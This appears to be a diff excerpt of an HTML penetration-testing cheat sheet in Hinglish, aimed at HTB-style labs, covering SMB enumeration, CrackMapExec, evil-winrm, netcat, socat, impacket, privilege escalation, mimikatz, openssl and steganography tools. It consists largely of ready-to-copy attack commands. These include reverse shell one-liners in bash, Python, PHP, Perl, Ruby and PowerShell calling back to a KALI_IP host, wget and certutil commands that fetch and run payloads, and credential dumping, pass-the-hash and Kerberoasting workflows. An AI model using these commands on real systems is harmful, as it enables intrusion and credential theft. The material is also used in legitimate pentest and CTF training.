+<tr><td>-r</td><td>RID</td><td>RID cycling se users nikalo</td></tr>
+<tr><td>-R 500-550</td><td>Range</td><td>RID range specify karo</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Verbose output</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🗺️ SMBMAP</h2><span class="cat c-g">SMB</span></div>
+<div class="tool-desc">SMB shares permissions check karo, files dhundho, commands run karo</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-H HOST</td><td>Host</td><td>Target IP</td></tr>
+<tr><td>-u username</td><td>User</td><td>Username (guest/anonymous = "")</td></tr>
+<tr><td>-p password</td><td>Pass</td><td>Password</td></tr>
+<tr><td>-d DOMAIN</td><td>Domain</td><td>Domain name</td></tr>
+<tr><td>-r share</td><td>List</td><td>Share ke contents list karo</td></tr>
+<tr><td>-R share</td><td>Recurse</td><td>Recursive list</td></tr>
+<tr><td>--download share/file</td><td>Download</td><td>File download karo</td></tr>
+<tr><td>--upload file share/path</td><td>Upload</td><td>File upload karo</td></tr>
+<tr><td>-x "cmd"</td><td>Execute</td><td>Command execute karo (admin rights chahiye)</td></tr>
+<tr><td>-A pattern</td><td>Search</td><td>Pattern match karo files mein</td></tr>
+<tr><td>-q</td><td>Quiet</td><td>Quiet mode</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>⚔️ CRACKMAPEXEC (CME/NXC)</h2><span class="cat c-g">Windows</span></div>
+<div class="tool-desc">Windows network ka Swiss army knife — SMB, WinRM, LDAP, RDP, SSH attack karo</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── PROTOCOLS ──</td></tr>
+<tr><td>smb</td><td>Protocol</td><td>SMB protocol (445)</td></tr>
+<tr><td>winrm</td><td>Protocol</td><td>Windows Remote Management (5985)</td></tr>
+<tr><td>ldap</td><td>Protocol</td><td>LDAP (389/636)</td></tr>
+<tr><td>rdp</td><td>Protocol</td><td>Remote Desktop (3389)</td></tr>
+<tr><td>ssh</td><td>Protocol</td><td>SSH (22)</td></tr>
+<tr><td>mssql</td><td>Protocol</td><td>MS SQL Server (1433)</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── COMMON FLAGS ──</td></tr>
+<tr><td>-u username</td><td>User</td><td>Single username</td></tr>
+<tr><td>-u users.txt</td><td>Users</td><td>Username list</td></tr>
+<tr><td>-p password</td><td>Pass</td><td>Single password</td></tr>
+<tr><td>-p pass.txt</td><td>Passes</td><td>Password list</td></tr>
+<tr><td>-H HASH</td><td>Hash</td><td>Pass-the-Hash attack</td></tr>
+<tr><td>-d DOMAIN</td><td>Domain</td><td>Domain name</td></tr>
+<tr><td>--local-auth</td><td>Auth</td><td>Local auth (not domain)</td></tr>
+<tr><td>--continue-on-success</td><td>Mode</td><td>First match pe stop mat karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── SMB FLAGS ──</td></tr>
+<tr><td>--shares</td><td>Enum</td><td>Shares list karo</td></tr>
+<tr><td>--users</td><td>Enum</td><td>Domain users list</td></tr>
+<tr><td>--groups</td><td>Enum</td><td>Domain groups</td></tr>
+<tr><td>--sessions</td><td>Enum</td><td>Active sessions</td></tr>
+<tr><td>--disks</td><td>Enum</td><td>Disks list</td></tr>
+<tr><td>--loggedon-users</td><td>Enum</td><td>Logged on users</td></tr>
+<tr><td>-x "cmd"</td><td>Execute</td><td>Windows command execute</td></tr>
+<tr><td>-X "ps1_cmd"</td><td>Execute</td><td>PowerShell command execute</td></tr>
+<tr><td>--sam</td><td>Dump</td><td>SAM database dump</td></tr>
+<tr><td>--lsa</td><td>Dump</td><td>LSA secrets dump</td></tr>
+<tr><td>--ntds</td><td>Dump</td><td>NTDS.dit dump (DC pe)</td></tr>
+<tr><td>-M module</td><td>Module</td><td>Extra module use karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── WINRM FLAGS ──</td></tr>
+<tr><td>-x "whoami"</td><td>Execute</td><td>Command execute</td></tr>
+<tr><td>-X "Get-Process"</td><td>PS</td><td>PowerShell execute</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Commands</div>
+<div class="ex">crackmapexec smb 10.10.10.1 <span class="f">-u</span> admin <span class="f">-p</span> pass <span class="f">--shares</span></div>
+<div class="ex">crackmapexec smb 10.10.10.0/24 <span class="f">-u</span> users.txt <span class="f">-p</span> passwords.txt</div>
+<div class="ex">crackmapexec winrm 10.10.10.1 <span class="f">-u</span> admin <span class="f">-p</span> pass <span class="f">-x</span> "whoami"</div>
+<div class="ex">crackmapexec smb 10.10.10.1 <span class="f">-u</span> admin <span class="f">-H</span> <span class="a">NTLM_HASH</span> <span class="f">--sam</span></div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>👿 EVIL-WINRM</h2><span class="cat c-g">Windows</span><span class="port">Port 5985</span></div>
+<div class="tool-desc">Windows Remote Management se PowerShell shell lo — HTB Windows mein bahut use</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-i IP</td><td>Target</td><td>Target IP</td></tr>
+<tr><td>-u username</td><td>User</td><td>Username</td></tr>
+<tr><td>-p password</td><td>Pass</td><td>Password</td></tr>
+<tr><td>-H HASH</td><td>Hash</td><td>NTLM hash — Pass-the-Hash</td></tr>
+<tr><td>-P port</td><td>Port</td><td>Custom port (default 5985)</td></tr>
+<tr><td>-s scripts/</td><td>Scripts</td><td>PowerShell scripts folder</td></tr>
+<tr><td>-e executables/</td><td>Exe</td><td>Executables folder</td></tr>
+<tr><td>-c cert.pem</td><td>Cert</td><td>SSL certificate (port 5986)</td></tr>
+<tr><td>-k key.pem</td><td>Key</td><td>SSL key</td></tr>
+<tr><td>-S</td><td>SSL</td><td>SSL use karo (5986)</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── INSIDE SHELL ──</td></tr>
+<tr><td>upload src dst</td><td>Transfer</td><td>File upload karo</td></tr>
+<tr><td>download src dst</td><td>Transfer</td><td>File download karo</td></tr>
+<tr><td>Invoke-Binary ./prog.exe</td><td>Execute</td><td>Exe run karo (memory mein)</td></tr>
+<tr><td>menu</td><td>Help</td><td>Available commands dikhao</td></tr>
+</table>
+</div>
+
+</div><!-- smb -->
+
+<!-- ═══ SHELLS/NETCAT ═══ -->
+<div class="sheet" id="s-shells">
+
+<div class="tool">
+<div class="tool-title"><h2>🔌 NETCAT (nc)</h2><span class="cat c-b">Shell</span></div>
+<div class="tool-desc">Swiss army knife — TCP/UDP connections, port scanning, file transfer, reverse shells</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-l</td><td>Listen</td><td>Listen mode — incoming connections wait karo</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Verbose — kya ho raha hai dikhao</td></tr>
+<tr><td>-vv</td><td>Verbose</td><td>Zyada verbose</td></tr>
+<tr><td>-n</td><td>NoLookup</td><td>DNS lookup mat karo — sirf IP</td></tr>
+<tr><td>-p PORT</td><td>Port</td><td>Port specify karo (listen ya source)</td></tr>
+<tr><td>-e /bin/bash</td><td>Execute</td><td>Connection pe program execute karo</td></tr>
+<tr><td>-u</td><td>UDP</td><td>UDP mode use karo</td></tr>
+<tr><td>-z</td><td>Zero I/O</td><td>Port scanning — connect test karo</td></tr>
+<tr><td>-w 3</td><td>Timeout</td><td>Connection timeout seconds</td></tr>
+<tr><td>-k</td><td>KeepListen</td><td>Connection close hone ke baad bhi listen karo</td></tr>
+<tr><td>-s IP</td><td>Source</td><td>Source IP bind karo</td></tr>
+<tr><td>-q 1</td><td>Quit</td><td>EOF ke baad N seconds wait karke quit</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Essential Commands</div>
+<div class="ex"><span class="c"># Listener — reverse shell pakadna</span>
+nc <span class="f">-lvnp</span> 4444</div>
+<div class="ex"><span class="c"># Reverse shell bhejona (victim pe)</span>
+nc <span class="a">KALI_IP</span> 4444 <span class="f">-e</span> /bin/bash</div>
+<div class="ex"><span class="c"># Port check</span>
+nc <span class="f">-zv</span> TARGET 80</div>
+<div class="ex"><span class="c"># Port range scan</span>
+nc <span class="f">-zv</span> TARGET 20-100</div>
+<div class="ex"><span class="c"># File transfer — receiver pe</span>
+nc <span class="f">-lvnp</span> 9001 > received.file
+<span class="c"># Sender pe:</span>
+nc TARGET 9001 < file.to.send</div>
+<div class="ex"><span class="c"># Banner grab</span>
+nc TARGET 22</div>
+<div class="ex"><span class="c"># mkfifo reverse shell (no -e support)</span>
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc KALI_IP 4444 > /tmp/f</div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🔗 SOCAT</h2><span class="cat c-b">Shell</span></div>
+<div class="tool-desc">netcat ka powerful version — stable TTY shells, SSL, port forward</div>
+<table>
+<tr><th>Flag / Option</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>TCP-L:PORT</td><td>Listen</td><td>TCP listen on port</td></tr>
+<tr><td>TCP:IP:PORT</td><td>Connect</td><td>TCP connect</td></tr>
+<tr><td>UDP-L:PORT</td><td>Listen</td><td>UDP listen</td></tr>
+<tr><td>EXEC:/bin/bash</td><td>Execute</td><td>Program execute karo</td></tr>
+<tr><td>pty</td><td>TTY</td><td>Pseudo TTY allocate karo</td></tr>
+<tr><td>stderr</td><td>Output</td><td>stderr bhi bhejo</td></tr>
+<tr><td>sigint</td><td>Signal</td><td>SIGINT forward karo</td></tr>
+<tr><td>setsid</td><td>Session</td><td>New session banao</td></tr>
+<tr><td>sane</td><td>TTY</td><td>TTY sane mode</td></tr>
+<tr><td>SSL</td><td>Encrypt</td><td>SSL connection</td></tr>
+<tr><td>verify=0</td><td>SSL</td><td>Certificate verify mat karo</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Stable TTY Shell — Best Shell!</div>
+<div class="ex"><span class="c"># Kali pe listener:</span>
+socat file:`tty`,raw,echo=0 TCP-L:4444</div>
+<div class="ex"><span class="c"># Victim pe:</span>
+socat TCP:KALI_IP:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane</div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🐚 REVERSE SHELL CHEATSHEET</h2><span class="cat c-b">Quick Ref</span></div>
+<div class="tool-desc">Sabse common reverse shell one-liners — copy karo aur use karo</div>
+<div class="ex-block">
+<div class="ex"><span class="c"># BASH</span>
+bash -c 'bash -i >& /dev/tcp/<span class="a">KALI_IP</span>/4444 0>&1'</div>
+<div class="ex"><span class="c"># Python3</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="a">KALI_IP</span>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</div>
+<div class="ex"><span class="c"># PHP</span>
+php -r '$sock=fsockopen("<span class="a">KALI_IP</span>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'</div>
+<div class="ex"><span class="c"># Perl</span>
+perl -e 'use Socket;$i="<span class="a">KALI_IP</span>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'</div>
+<div class="ex"><span class="c"># Ruby</span>
+ruby -rsocket -e'f=TCPSocket.open("<span class="a">KALI_IP</span>",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'</div>
+<div class="ex"><span class="c"># PowerShell (Windows)</span>
+powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('<span class="a">KALI_IP</span>',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</div>
+<div class="ex"><span class="c"># Shell Upgrade (limited shell milne ke baad)</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+<span class="c"># Ctrl+Z phir:</span>
+stty raw -echo; fg
+export TERM=xterm
+stty rows 38 columns 116</div>
+</div>
+</div>
+
+</div><!-- shells -->
+
+<!-- ═══ IMPACKET ═══ -->
+<div class="sheet" id="s-impacket">
+
+<div class="tool">
+<div class="tool-title"><h2>🪟 IMPACKET SUITE</h2><span class="cat c-b">Windows/AD</span></div>
+<div class="tool-desc">Python Windows network protocol tools collection — secretsdump, psexec, wmiexec, Kerberos attacks</div>
+<div class="install"><b>Install:</b> pip3 install impacket  |  sudo apt install python3-impacket  |  git clone https://github.com/fortra/impacket</div>
+<table>
+<tr><th>Tool / Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── secretsdump.py — CREDENTIAL DUMP ──</td></tr>
+<tr><td>domain/user:pass@IP</td><td>Auth</td><td>Credentials — SAM/LSA/NTDS dump karo</td></tr>
+<tr><td>user@IP -hashes :NTLM</td><td>PtH</td><td>Pass-the-Hash se dump</td></tr>
+<tr><td>-ntds ntds.dit -system SYSTEM LOCAL</td><td>Offline</td><td>NTDS file se offline dump</td></tr>
+<tr><td>-just-dc-ntlm</td><td>Filter</td><td>Sirf NTLM hashes (DC dump)</td></tr>
+<tr><td>-outputfile hashes</td><td>Output</td><td>Output file</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── psexec.py — SYSTEM SHELL ──</td></tr>
+<tr><td>domain/admin:pass@IP</td><td>Auth</td><td>SYSTEM shell via SMB</td></tr>
+<tr><td>user@IP -hashes :HASH</td><td>PtH</td><td>Pass-the-Hash</td></tr>
+<tr><td>-port 445</td><td>Port</td><td>SMB port</td></tr>
+<tr><td>-c program.exe</td><td>Copy</td><td>File copy karke execute</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── wmiexec.py — QUIET SHELL ──</td></tr>
+<tr><td>domain/user:pass@IP</td><td>Auth</td><td>WMI se semi-interactive shell</td></tr>
+<tr><td>user@IP -hashes :HASH</td><td>PtH</td><td>Pass-the-Hash</td></tr>
+<tr><td>user@IP "whoami"</td><td>Cmd</td><td>Single command run karo</td></tr>
+<tr><td>-shell-type powershell</td><td>Shell</td><td>PowerShell shell</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── GetNPUsers.py — AS-REP ROAST ──</td></tr>
+<tr><td>domain/ -usersfile users.txt -no-pass</td><td>NoAuth</td><td>Pre-auth disabled users ke hashes</td></tr>
+<tr><td>domain/user:pass -request</td><td>Auth</td><td>Authenticated — sab users check karo</td></tr>
+<tr><td>-format hashcat</td><td>Format</td><td>Hashcat format mein output</td></tr>
+<tr><td>-format john</td><td>Format</td><td>John format</td></tr>
+<tr><td>-outputfile hashes.txt</td><td>Output</td><td>Output file</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── GetUserSPNs.py — KERBEROAST ──</td></tr>
+<tr><td>domain/user:pass</td><td>Auth</td><td>Service account TGS hashes nikalo</td></tr>
+<tr><td>-request</td><td>Request</td><td>TGS hashes request karo</td></tr>
+<tr><td>-outputfile kerberoast.txt</td><td>Output</td><td>Save karo</td></tr>
+<tr><td>-dc-ip DC_IP</td><td>DC</td><td>DC IP specify karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── smbserver.py — SMB SERVER ──</td></tr>
+<tr><td>share $(pwd)</td><td>Basic</td><td>Current dir ko share banao</td></tr>
+<tr><td>share /path -smb2support</td><td>SMB2</td><td>SMB2 support ke saath</td></tr>
+<tr><td>share /path -username user -password pass</td><td>Auth</td><td>Auth wala share</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── MISC TOOLS ──</td></tr>
+<tr><td>mssqlclient.py domain/user:pass@IP</td><td>MSSQL</td><td>MSSQL connect — xp_cmdshell se RCE</td></tr>
+<tr><td>lookupsid.py domain/user:pass@IP</td><td>SID</td><td>SID enumerate karo</td></tr>
+<tr><td>rpcdump.py IP</td><td>RPC</td><td>RPC endpoints dump</td></tr>
+<tr><td>reg.py domain/user:pass@IP query -keyName "HKLM\\SAM"</td><td>Registry</td><td>Registry queries</td></tr>
+<tr><td>ntlmrelayx.py -tf targets.txt -smb2support</td><td>Relay</td><td>NTLM relay attack</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Workflow</div>
+<div class="ex"><span class="c"># AS-REP Roast</span>
+GetNPUsers.py domain.local/ <span class="f">-usersfile</span> users.txt <span class="f">-no-pass -format</span> hashcat <span class="f">-outputfile</span> asrep.txt
+hashcat <span class="f">-m</span> 18200 asrep.txt rockyou.txt</div>
+<div class="ex"><span class="c"># Kerberoast</span>
+GetUserSPNs.py domain.local/user:pass <span class="f">-request -outputfile</span> kerb.txt
+hashcat <span class="f">-m</span> 13100 kerb.txt rockyou.txt</div>
+<div class="ex"><span class="c"># secretsdump - hash dump</span>
+secretsdump.py domain/admin:pass@DC_IP</div>
+</div>
+</div>
+
+</div><!-- impacket -->
+
+<!-- ═══ PRIV ESC ═══ -->
+<div class="sheet" id="s-privesc">
+
+<div class="tool">
+<div class="tool-title"><h2>📈 LINPEAS / WINPEAS</h2><span class="cat c-p">Priv Esc</span></div>
+<div class="tool-desc">Automatic privilege escalation enumeration — SUID, sudo, cron, writable paths, credentials sab check</div>
+<table>
+<tr><th>Flag / Option</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── LINPEAS (Linux) ──</td></tr>
+<tr><td>./linpeas.sh</td><td>Run</td><td>Full enumeration</td></tr>
+<tr><td>./linpeas.sh -a</td><td>All</td><td>All checks — thorough scan</td></tr>
+<tr><td>./linpeas.sh -s</td><td>Super</td><td>Super fast — less checks</td></tr>
+<tr><td>./linpeas.sh -q</td><td>Quiet</td><td>Quiet mode</td></tr>
+<tr><td>./linpeas.sh | tee output.txt</td><td>Save</td><td>Output save karo</td></tr>
+<tr><td>./linpeas.sh -e</td><td>Encrypt</td><td>Encrypted output (exfil ke liye)</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── WINPEAS (Windows) ──</td></tr>
+<tr><td>.\winPEASx64.exe</td><td>Run</td><td>Full enumeration 64-bit</td></tr>
+<tr><td>.\winPEASx86.exe</td><td>Run</td><td>32-bit version</td></tr>
+<tr><td>.\winPEASany.exe</td><td>Run</td><td>Any architecture</td></tr>
+<tr><td>.\winPEASx64.exe quiet</td><td>Quiet</td><td>Quiet mode</td></tr>
+<tr><td>.\winPEASx64.exe notcolor</td><td>NoColor</td><td>Colors disable</td></tr>
+<tr><td>.\winPEASx64.exe log</td><td>Log</td><td>Log file save karo</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Transfer + Run</div>
+<div class="ex"><span class="c"># Kali pe HTTP server</span>
+python3 <span class="f">-m</span> http.server 8000</div>
+<div class="ex"><span class="c"># Linux victim pe download + run</span>
+wget http://KALI_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh 2>&1 | tee /tmp/lp.out</div>
+<div class="ex"><span class="c"># Windows victim pe download</span>
+certutil -urlcache -f http://KALI_IP:8000/winPEASx64.exe winpeas.exe && .\winpeas.exe</div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🕐 PSPY — Process Monitor</h2><span class="cat c-p">Priv Esc</span></div>
+<div class="tool-desc">Bina root ke background processes monitor karo — cron jobs, root scripts dekho</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>./pspy64</td><td>Run</td><td>64-bit run karo</td></tr>
+<tr><td>./pspy32</td><td>Run</td><td>32-bit</td></tr>
+<tr><td>-p</td><td>Procs</td><td>Processes print karo</td></tr>
+<tr><td>-f</td><td>Files</td><td>File system events bhi dekho</td></tr>
+<tr><td>-i 1000</td><td>Interval</td><td>Interval milliseconds (default 100)</td></tr>
+<tr><td>-r /path</td><td>Watch</td><td>Specific path watch karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>💎 MIMIKATZ</h2><span class="cat c-p">Windows</span></div>
+<div class="tool-desc">Windows memory se cleartext passwords, hashes, Kerberos tickets dump karo</div>
+<table>
+<tr><th>Command</th><th>Module</th><th>Matlab / Use</th></tr>
+<tr><td>privilege::debug</td><td>Privilege</td><td>Pehle ye karo — debug privilege chahiye</td></tr>
+<tr><td>sekurlsa::logonpasswords</td><td>sekurlsa</td><td>Cleartext passwords + hashes LSASS se</td></tr>
+<tr><td>sekurlsa::wdigest</td><td>sekurlsa</td><td>WDigest cleartext passwords</td></tr>
+<tr><td>sekurlsa::pth /user:X /domain:Y /ntlm:Z /run:cmd.exe</td><td>sekurlsa</td><td>Pass-the-Hash attack</td></tr>
+<tr><td>lsadump::sam</td><td>lsadump</td><td>SAM database dump — local hashes</td></tr>
+<tr><td>lsadump::lsa /patch</td><td>lsadump</td><td>LSA secrets dump</td></tr>
+<tr><td>lsadump::dcsync /user:krbtgt</td><td>lsadump</td><td>DCSync — DC se hashes sync (Domain Admin needed)</td></tr>
+<tr><td>kerberos::list</td><td>kerberos</td><td>Kerberos tickets list karo</td></tr>
+<tr><td>kerberos::list /export</td><td>kerberos</td><td>Tickets export karo (.kirbi)</td></tr>
+<tr><td>kerberos::ptt ticket.kirbi</td><td>kerberos</td><td>Pass-the-Ticket attack</td></tr>
+<tr><td>token::elevate</td><td>token</td><td>SYSTEM token impersonate karo</td></tr>
+<tr><td>token::list</td><td>token</td><td>Tokens list karo</td></tr>
+<tr><td>crypto::certificates /export</td><td>crypto</td><td>Certificates export karo</td></tr>
+<tr><td>misc::cmd</td><td>misc</td><td>New elevated cmd.exe open karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🩸 MANUAL LINUX PRIV ESC</h2><span class="cat c-p">Linux</span></div>
+<div class="tool-desc">LinPEAS ke baad manual checks — important ek ek command</div>
+<table>
+<tr><th>Command</th><th>Kya check karta hai</th><th>Attack Vector</th></tr>
+<tr><td>sudo -l</td><td>Sudo permissions</td><td>GTFOBins se exploit karo</td></tr>
+<tr><td>find / -perm -4000 -type f 2>/dev/null</td><td>SUID files</td><td>GTFOBins pe dhundho</td></tr>
+<tr><td>find / -perm -2000 -type f 2>/dev/null</td><td>SGID files</td><td>Group privileges</td></tr>
+<tr><td>cat /etc/crontab</td><td>Cron jobs</td><td>Root script modify karo</td></tr>
+<tr><td>crontab -l</td><td>User crons</td><td>User cron jobs</td></tr>
+<tr><td>ls /etc/cron.d/ /etc/cron.hourly/</td><td>Cron dirs</td><td>Writable scripts?</td></tr>
+<tr><td>cat /etc/passwd</td><td>Users</td><td>Home directories, shells</td></tr>
+<tr><td>cat /etc/shadow</td><td>Hashes</td><td>John/Hashcat se crack karo</td></tr>
+<tr><td>find / -writable -not -path "*/proc/*" 2>/dev/null</td><td>Writable files</td><td>Config files overwrite karo</td></tr>
+<tr><td>find / -name "*.conf" -o -name "*.config" 2>/dev/null</td><td>Config files</td><td>Credentials dhundho</td></tr>
+<tr><td>ss -tlnp</td><td>Open ports</td><td>Internal services — forward karo</td></tr>
+<tr><td>netstat -antup</td><td>Connections</td><td>Same</td></tr>
+<tr><td>uname -a</td><td>Kernel version</td><td>Kernel exploits searchsploit mein</td></tr>
+<tr><td>cat /proc/version</td><td>OS version</td><td>Exploits dhundho</td></tr>
+<tr><td>id</td><td>Groups</td><td>Docker/lxd/disk group = root!</td></tr>
+<tr><td>env</td><td>Environment</td><td>Credentials in env vars</td></tr>
+<tr><td>history / cat ~/.bash_history</td><td>History</td><td>Cleartext passwords in commands</td></tr>
+<tr><td>find / -name id_rsa 2>/dev/null</td><td>SSH keys</td><td>Private keys dhundho</td></tr>
+<tr><td>ls -la /opt /var/www /srv /backup</td><td>Custom dirs</td><td>Custom app files</td></tr>
+<tr><td>getcap -r / 2>/dev/null</td><td>Capabilities</td><td>cap_setuid = root!</td></tr>
+<tr><td>cat /etc/exports</td><td>NFS</td><td>no_root_squash = root mount karo</td></tr>
+</table>
+</div>
+
+</div><!-- privesc -->
+
+<!-- ═══ CRYPTO/DECODE ═══ -->
+<div class="sheet" id="s-crypto">
+
+<div class="tool">
+<div class="tool-title"><h2>🔒 OPENSSL</h2><span class="cat c-g">Crypto</span></div>
+<div class="tool-desc">SSL/TLS, encryption, decryption, hashes, certificates, keys — sab kuch</div>
+<table>
+<tr><th>Command</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>s_client -connect IP:443</td><td>TLS</td><td>SSL/TLS certificate information dekho</td></tr>
+<tr><td>s_client -connect IP:443 -showcerts</td><td>TLS</td><td>Full certificate chain dikhao</td></tr>
+<tr><td>x509 -in cert.pem -text</td><td>Cert</td><td>Certificate parse karo aur print karo</td></tr>
+<tr><td>x509 -in cert.pem -noout -dates</td><td>Cert</td><td>Certificate validity dates</td></tr>
+<tr><td>rsa -in private.pem -text</td><td>RSA</td><td>RSA private key details</td></tr>
+<tr><td>rsa -in private.pem -pubout</td><td>RSA</td><td>Public key extract karo</td></tr>
+<tr><td>genrsa -out key.pem 2048</td><td>Gen</td><td>RSA key generate karo</td></tr>
+<tr><td>enc -aes-256-cbc -d -in enc.file -out dec.file -k pass</td><td>Decrypt</td><td>AES decrypt karo</td></tr>
+<tr><td>enc -aes-256-cbc -in file -out enc.file -k pass</td><td>Encrypt</td><td>AES encrypt karo</td></tr>
+<tr><td>dgst -md5 file</td><td>Hash</td><td>MD5 hash generate karo</td></tr>
+<tr><td>dgst -sha256 file</td><td>Hash</td><td>SHA256 hash</td></tr>
+<tr><td>passwd -6 password</td><td>Hash</td><td>SHA512 crypt password hash</td></tr>
+<tr><td>passwd -1 password</td><td>Hash</td><td>MD5 crypt password hash</td></tr>
+<tr><td>pkcs12 -export -in cert.pem -inkey key.pem -out bundle.pfx</td><td>PKCS12</td><td>PFX bundle banao</td></tr>
+<tr><td>verify -CAfile ca.crt cert.pem</td><td>Verify</td><td>Certificate verify karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🔍 ENCODING/DECODING — Terminal</h2><span class="cat c-g">Decode</span></div>
+<div class="tool-desc">Base64, hex, URL, binary — terminal se seedha encode/decode karo</div>
+<table>
+<tr><th>Command</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>echo "text" | base64</td><td>Base64</td><td>Base64 encode</td></tr>
+<tr><td>echo "SGVsbG8=" | base64 -d</td><td>Base64</td><td>Base64 decode</td></tr>
+<tr><td>base64 -d file.b64</td><td>Base64</td><td>File decode karo</td></tr>
+<tr><td>echo "text" | xxd</td><td>Hex</td><td>Hex view</td></tr>
+<tr><td>echo "48656c6c6f" | xxd -r -p</td><td>Hex</td><td>Hex decode</td></tr>
+<tr><td>xxd file | head</td><td>Hex</td><td>File ke pehle bytes hex mein</td></tr>
+<tr><td>xxd -r hexdump > binary</td><td>Hex</td><td>Hexdump se binary banao</td></tr>
+<tr><td>python3 -c "print(bytes.fromhex('48656c6c6f').decode())"</td><td>Hex</td><td>Python se hex decode</td></tr>
+<tr><td>python3 -c "import urllib.parse;print(urllib.parse.unquote('hello%20world'))"</td><td>URL</td><td>URL decode</td></tr>
+<tr><td>printf '%s' "text" | iconv -t UTF-16LE | base64</td><td>Encode</td><td>UTF-16 LE base64 (PowerShell ke liye)</td></tr>
+<tr><td>cat file | tr 'A-Za-z' 'N-ZA-Mn-za-m'</td><td>ROT13</td><td>ROT13 cipher</td></tr>
+<tr><td>echo "text" | od -A x -t x1z</td><td>Hex</td><td>Octal dump — hex format</td></tr>
+</table>
+<div class="note">💡 CyberChef = Best Tool! → https://gchq.github.io/CyberChef — har encoding/decoding browser mein visually!</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🕵️ STEGANOGRAPHY TOOLS</h2><span class="cat c-y">CTF</span></div>
+<div class="tool-desc">Files mein hidden data dhundho — images, audio, binaries</div>
+<table>
+<tr><th>Tool / Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── STEGHIDE ──</td></tr>
+<tr><td>steghide info file.jpg</td><td>Info</td><td>Kya hidden data hai?</td></tr>
+<tr><td>steghide extract -sf file.jpg</td><td>Extract</td><td>No password extract karo</td></tr>
+<tr><td>steghide extract -sf file.jpg -p "pass"</td><td>Extract</td><td>Password ke saath</td></tr>
+<tr><td>steghide embed -cf img.jpg -sf secret.txt</td><td>Embed</td><td>Data chupaao image mein</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── BINWALK ──</td></tr>
+<tr><td>binwalk file</td><td>Scan</td><td>File ke andar kya embedded hai</td></tr>
